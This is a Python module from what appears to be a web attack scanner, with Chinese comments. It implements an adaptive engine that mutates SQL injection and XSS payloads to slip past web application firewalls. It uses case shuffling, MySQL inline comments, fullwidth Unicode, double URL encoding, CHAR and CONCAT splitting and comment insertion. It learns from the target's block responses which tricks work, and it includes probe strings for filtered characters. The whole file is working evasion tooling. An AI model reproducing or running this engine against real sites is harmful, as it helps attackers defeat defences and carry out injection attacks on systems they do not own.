"""
utils/mutator.py — 自适应 AI 变异引擎 (Adaptive Intelligent Payload Mutator)

核心创新:
  不再依赖静态 Payload 字典。根据 WAF 的实时拦截反馈 (403/406/501) 和
  响应延迟模式，动态调整编码策略 (Unicode/HPP/Padding/Case-Shifting),
  实现 "千站千面" 的自适应绕过。

架构:
  ┌─────────────────────────────────────────┐
  │         AdaptiveMutator (核心)           │
  ├─────────────────────────────────────────┤
  │  FeedbackLoop (反馈回路)                │
  │    • 观察 WAF 拦截状态码               │
  │    • 记录各编码策略的成功/失败率         │
  │    • 自适应权重更新                     │
  ├─────────────────────────────────────────┤
  │  MutationStrategy (变异策略池)           │
  │    1. CaseShuffle    — 大小写随机        │
  │    2. InlineComment  — MySQL 内联注释    │
  │    3. UnicodeEscape  — Unicode 全/半角   │
  │    4. HPP            — 参数污染          │
  │    5. ChunkEncoding  — 分块传输混淆      │
  │    6. DoubleEncode   — 双重 URL 编码     │
  │    7. WhitespaceSub  — 空白符替代        │
  │    8. ConcatSplit    — 字符串拼接切割    │
  └─────────────────────────────────────────┘

使用方式:
    mutator = AdaptiveMutator()
    for payload in original_payloads:
        variants = mutator.mutate(payload, feedback)
        for v in variants:
            resp = await requester.get(url_with(v))
            mutator.feedback(v, resp.status_code)
"""

from __future__ import annotations

import logging
import random
import re
import string
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import quote

logger = logging.getLogger("openscanner.mutator")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 变异策略枚举
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MutationStrategy(Enum):
    """变异策略类型"""
    CASE_SHUFFLE = auto()       # 大小写随机变异
    INLINE_COMMENT = auto()     # MySQL 版本化内联注释
    UNICODE_ESCAPE = auto()     # Unicode 全/半角绕过
    DOUBLE_ENCODE = auto()      # 双重 URL 编码
    WHITESPACE_SUB = auto()     # 空白符替代 (Tab/LF/CR//**/)
    CONCAT_SPLIT = auto()       # 字符串拼接切割
    HPP_DUPLICATE = auto()      # HTTP Parameter Pollution
    CHAR_ENCODE = auto()        # CHAR() 函数编码
    COMMENT_INJECTION = auto()  # 注释符注入干扰


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 反馈记录
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dataclass
class MutationFeedback:
    """单次变异的反馈记录"""
    strategy: MutationStrategy
    status_code: int
    was_blocked: bool           # 是否被 WAF 拦截
    response_time: float = 0.0  # 响应耗时 (秒)
    
    @property
    def was_successful(self) -> bool:
        """是否成功绕过 (非拦截状态)"""
        return not self.was_blocked


@dataclass
class StrategyStats:
    """单个策略的历史统计"""
    total_attempts: int = 0
    successful: int = 0
    blocked: int = 0
    weight: float = 1.0    # 自适应权重 [0.0, 2.0]
    
    @property
    def success_rate(self) -> float:
        if self.total_attempts == 0:
            return 0.5  # 未知策略给中等权重
        return self.successful / self.total_attempts
    
    def update(self, success: bool) -> None:
        """更新统计并重新计算权重"""
        self.total_attempts += 1
        if success:
            self.successful += 1
        else:
            self.blocked += 1
        
        # 自适应权重: 成功率高的策略获得更多机会
        # 使用指数移动平均避免极端波动
        target_weight = 0.3 + 1.7 * self.success_rate
        self.weight = self.weight * 0.7 + target_weight * 0.3


# WAF 拦截状态码集合
_WAF_BLOCK_CODES: Set[int] = {403, 406, 429, 444, 451, 493, 501, 503, 999}

# SQL/XSS 关键词 (用于变异)
_SQL_KEYWORDS = [
    "SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE",
    "DELETE", "DROP", "ORDER", "BY", "GROUP", "HAVING", "NULL", "CONCAT",
    "EXTRACTVALUE", "UPDATEXML", "SLEEP", "BENCHMARK", "WAITFOR", "DELAY",
    "LIKE", "BETWEEN", "CASE", "WHEN", "THEN", "ELSE", "END",
]

_XSS_KEYWORDS = [
    "script", "alert", "confirm", "prompt", "onerror", "onload",
    "onmouseover", "onfocus", "onblur", "eval", "document", "window",
    "innerHTML", "location",
]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 变异函数库
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _case_shuffle(payload: str) -> str:
    """大小写随机变异 — OR → oR, SELECT → sElEcT"""
    result = []
    i = 0
    text = payload
    # 找到所有关键词位置并随机化
    for kw in _SQL_KEYWORDS + _XSS_KEYWORDS:
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        text = pattern.sub(
            lambda m: "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in m.group()
            ),
            text,
        )
    return text


def _inline_comment(payload: str) -> str:
    """MySQL 版本化内联注释 — SELECT → /*!50000SELECT*/"""
    versions = ["50000", "50001", "40100", "50500", "50600"]
    for kw in ["SELECT", "UNION", "AND", "OR", "FROM", "WHERE"]:
        ver = random.choice(versions)
        payload = re.sub(
            re.escape(kw),
            f"/*!{ver}{kw}*/",
            payload,
            flags=re.IGNORECASE,
            count=1,
        )
    return payload


def _unicode_escape(payload: str) -> str:
    """Unicode 全/半角绕过"""
    # 将 ASCII 字符映射到全角 Unicode 等价物
    fullwidth_map = {
        "'": "\uff07",    # ＇
        '"': "\uff02",    # ＂
        "<": "\uff1c",    # ＜
        ">": "\uff1e",    # ＞
        "(": "\uff08",    # （
        ")": "\uff09",    # ）
        "=": "\uff1d",    # ＝
        "/": "\uff0f",    # ／
    }
    # 随机替换部分字符 (不全部替换,保留语义)
    result = []
    for c in payload:
        if c in fullwidth_map and random.random() > 0.6:
            result.append(fullwidth_map[c])
        else:
            result.append(c)
    return "".join(result)


def _double_encode(payload: str) -> str:
    """双重 URL 编码 — ' → %27 → %2527"""
    # 第一层编码
    first = quote(payload, safe="")
    # 第二层: 将 % 编码为 %25
    return first.replace("%", "%25")


def _whitespace_sub(payload: str) -> str:
    """空白符替代 — 用 Tab/LF/注释 替代空格"""
    alternatives = ["/**/", "%09", "%0a", "%0d", "%0b", "%0c", "+"]
    alt = random.choice(alternatives)
    # 随机替换部分空格
    result = []
    for c in payload:
        if c == " " and random.random() > 0.3:
            result.append(alt)
        else:
            result.append(c)
    return "".join(result)


def _concat_split(payload: str) -> str:
    """字符串拼接切割 — 'admin' → CONCAT('ad','min')"""
    # 找到单引号包裹的字符串
    def split_string(match):
        s = match.group(1)
        if len(s) < 3:
            return match.group(0)
        mid = len(s) // 2
        return f"CONCAT('{s[:mid]}','{s[mid:]}')"
    
    return re.sub(r"'([^']{3,})'", split_string, payload)


def _char_encode(payload: str) -> str:
    """CHAR() 函数编码 — 'a' → CHAR(97)"""
    def encode_string(match):
        s = match.group(1)
        if len(s) > 10:  # 太长的不转换
            return match.group(0)
        chars = ",".join(str(ord(c)) for c in s)
        return f"CHAR({chars})"
    
    return re.sub(r"'([^']{1,10})'", encode_string, payload)


def _comment_injection(payload: str) -> str:
    """注释符注入干扰 — U/**/N/**/I/**/O/**/N"""
    keywords = ["UNION", "SELECT", "AND", "OR", "FROM"]
    for kw in keywords:
        if kw.lower() in payload.lower():
            broken = "/**/".join(list(kw))
            payload = re.sub(
                re.escape(kw), broken, payload,
                flags=re.IGNORECASE, count=1,
            )
            break
    return payload


# 策略 → 变异函数映射
_STRATEGY_FUNCTIONS: Dict[MutationStrategy, Callable[[str], str]] = {
    MutationStrategy.CASE_SHUFFLE: _case_shuffle,
    MutationStrategy.INLINE_COMMENT: _inline_comment,
    MutationStrategy.UNICODE_ESCAPE: _unicode_escape,
    MutationStrategy.DOUBLE_ENCODE: _double_encode,
    MutationStrategy.WHITESPACE_SUB: _whitespace_sub,
    MutationStrategy.CONCAT_SPLIT: _concat_split,
    MutationStrategy.CHAR_ENCODE: _char_encode,
    MutationStrategy.COMMENT_INJECTION: _comment_injection,
}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 自适应变异引擎 (Adaptive Intelligent Payload Mutator)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class AdaptiveMutator:
    """
    自适应 AI 变异引擎

    核心机制:
      1. 维护每个策略的成功/失败统计
      2. 根据 WAF 反馈自动调整策略权重
      3. 高权重策略获得更多变异机会
      4. 低权重策略逐渐被淘汰

    用法:
        mutator = AdaptiveMutator()
        
        # 生成变异
        variants = mutator.mutate(payload, context)
        
        # 反馈结果
        mutator.record_feedback(variant, status_code=200, response_time=0.5)
        
        # 查看洞察
        insights = mutator.get_insights()
    """

    def __init__(
        self,
        max_variants_per_payload: int = 6,
        initial_strategies: Optional[List[MutationStrategy]] = None,
    ) -> None:
        self._max_variants = max_variants_per_payload
        self._stats: Dict[MutationStrategy, StrategyStats] = {
            s: StrategyStats() for s in MutationStrategy
        }
        self._active_strategies = initial_strategies or list(MutationStrategy)
        self._blocked_chars: Set[str] = set()   # 被 WAF 过滤的字符
        self._variant_map: Dict[str, MutationStrategy] = {}  # variant → strategy 追踪
        self._generation = 0  # 进化代数
        
    # ── 核心变异接口 ──────────────────────────

    def mutate(
        self,
        payload: str,
        context: Optional[Dict[str, Any]] = None,
    ) -> List[str]:
        """
        对单个 Payload 生成一组自适应变异体。

        Args:
            payload: 原始 Payload
            context: 扫描上下文 (含 waf, detected_db_type 等)

        Returns:
            去重后的变异 Payload 列表 (不含原始)
        """
        context = context or {}
        self._generation += 1
        
        # 根据权重选择策略
        selected = self._select_strategies()
        
        variants: List[str] = []
        seen: Set[str] = {payload}
        
        for strategy in selected:
            func = _STRATEGY_FUNCTIONS.get(strategy)
            if not func:
                continue
                
            try:
                variant = func(payload)
                if variant and variant not in seen:
                    seen.add(variant)
                    variants.append(variant)
                    self._variant_map[variant] = strategy
            except Exception as exc:
                logger.debug(
                    "[Mutator] 策略 %s 变异失败: %s", strategy.name, exc
                )
        
        # 组合变异: 叠加两个策略 (高级模式)
        if len(variants) >= 2 and self._generation > 3:
            combo_variants = self._combo_mutate(payload, selected, seen)
            variants.extend(combo_variants)
        
        # 限制数量
        if len(variants) > self._max_variants:
            # 按策略权重排序，优先保留高权重策略的变异
            variants.sort(
                key=lambda v: self._stats.get(
                    self._variant_map.get(v, MutationStrategy.CASE_SHUFFLE),
                    StrategyStats()
                ).weight,
                reverse=True,
            )
            variants = variants[:self._max_variants]
        
        logger.debug(
            "[Mutator] gen=%d | 原始长度=%d | 生成 %d 个变异体",
            self._generation, len(payload), len(variants),
        )
        return variants

    def _select_strategies(self) -> List[MutationStrategy]:
        """根据自适应权重选择策略子集"""
        strategies = list(self._active_strategies)
        
        # 加权随机排序
        weights = [
            self._stats[s].weight + random.uniform(0, 0.3)
            for s in strategies
        ]
        
        paired = list(zip(strategies, weights))
        paired.sort(key=lambda x: x[1], reverse=True)
        
        # 取前 N 个 + 1 个随机探索项
        top_n = min(5, len(paired))
        selected = [s for s, _ in paired[:top_n]]
        
        # 探索: 随机加入一个低权重策略 (避免局部最优)
        remaining = [s for s, _ in paired[top_n:]]
        if remaining and random.random() > 0.5:
            selected.append(random.choice(remaining))
        
        return selected

    def _combo_mutate(
        self,
        payload: str,
        strategies: List[MutationStrategy],
        seen: Set[str],
    ) -> List[str]:
        """组合变异: 依次应用两个策略"""
        combos: List[str] = []
        pairs = [
            (MutationStrategy.CASE_SHUFFLE, MutationStrategy.WHITESPACE_SUB),
            (MutationStrategy.INLINE_COMMENT, MutationStrategy.CASE_SHUFFLE),
            (MutationStrategy.WHITESPACE_SUB, MutationStrategy.DOUBLE_ENCODE),
        ]
        
        for s1, s2 in pairs:
            if s1 not in strategies or s2 not in strategies:
                continue
            f1 = _STRATEGY_FUNCTIONS.get(s1)
            f2 = _STRATEGY_FUNCTIONS.get(s2)
            if not f1 or not f2:
                continue
            try:
                intermediate = f1(payload)
                final = f2(intermediate)
                if final not in seen:
                    seen.add(final)
                    combos.append(final)
                    self._variant_map[final] = s1  # 记录主策略
            except Exception:
                pass
        
        return combos[:2]  # 最多 2 个组合变异

    # ── 反馈接口 ──────────────────────────────

    def record_feedback(
        self,
        variant: str,
        status_code: int,
        response_time: float = 0.0,
    ) -> None:
        """
        记录 WAF 反馈，更新策略权重。

        Args:
            variant:       发送的变异 Payload
            status_code:   HTTP 响应状态码
            response_time: 响应耗时 (秒)
        """
        strategy = self._variant_map.get(variant)
        if not strategy:
            return
        
        was_blocked = status_code in _WAF_BLOCK_CODES
        stats = self._stats[strategy]
        stats.update(success=not was_blocked)
        
        logger.debug(
            "[Mutator] 反馈 | 策略=%s | status=%d | blocked=%s | "
            "权重=%.2f | 成功率=%.1f%%",
            strategy.name, status_code, was_blocked,
            stats.weight, stats.success_rate * 100,
        )
        
        # 如果某个策略连续失败超过阈值，自动检测被过滤的字符
        if stats.blocked >= 5 and stats.success_rate < 0.1:
            self._detect_blocked_chars(variant)

    def _detect_blocked_chars(self, payload: str) -> None:
        """分析被拦截 Payload 中的特征字符"""
        suspicious_chars = {"'", '"', "<", ">", "(", ")", ";", "--", "/*"}
        for c in suspicious_chars:
            if c in payload:
                self._blocked_chars.add(c)
        
        if self._blocked_chars:
            logger.info(
                "[Mutator] 检测到 WAF 过滤字符: %s",
                ", ".join(repr(c) for c in self._blocked_chars),
            )

    # ── 智能字符集探测 ────────────────────────

    def get_charset_probe_payloads(self) -> List[Tuple[str, str]]:
        """
        生成字符集探测 Payload — 逐个测试哪些字符被 WAF 过滤。

        Returns:
            [(probe_payload, character_name), ...]
        """
        probes = [
            ("test'value", "单引号 '"),
            ('test"value', '双引号 "'),
            ("test<value", "小于号 <"),
            ("test>value", "大于号 >"),
            ("test(value)", "括号 ()"),
            ("test;value", "分号 ;"),
            ("test--value", "SQL注释 --"),
            ("test/**/value", "块注释 /**/"),
            ("test%27value", "编码单引号 %27"),
            ("test%3Cvalue", "编码小于号 %3C"),
            ("test\\'value", "转义单引号 \\'"),
            ("test%2527value", "双重编码单引号 %2527"),
        ]
        return probes

    # ── 洞察与报告 ─────────────────────────────

    def get_insights(self) -> Dict[str, Any]:
        """
        获取变异引擎的运行洞察数据。

        Returns:
            包含各策略统计、被过滤字符、推荐策略等信息的字典
        """
        strategy_data = {}
        for strategy, stats in self._stats.items():
            strategy_data[strategy.name] = {
                "attempts": stats.total_attempts,
                "successful": stats.successful,
                "blocked": stats.blocked,
                "success_rate": round(stats.success_rate * 100, 1),
                "weight": round(stats.weight, 2),
            }
        
        # 按权重排序的策略推荐
        ranked = sorted(
            self._stats.items(),
            key=lambda x: x[1].weight,
            reverse=True,
        )
        
        return {
            "generation": self._generation,
            "total_strategies": len(self._active_strategies),
            "blocked_chars": list(self._blocked_chars),
            "strategies": strategy_data,
            "recommended_order": [s.name for s, _ in ranked],
            "top_strategy": ranked[0][0].name if ranked else "N/A",
        }

    def reset(self) -> None:
        """重置所有统计 (切换目标时调用)"""
        self._stats = {s: StrategyStats() for s in MutationStrategy}
        self._blocked_chars.clear()
        self._variant_map.clear()
        self._generation = 0
        logger.info("[Mutator] 统计已重置")
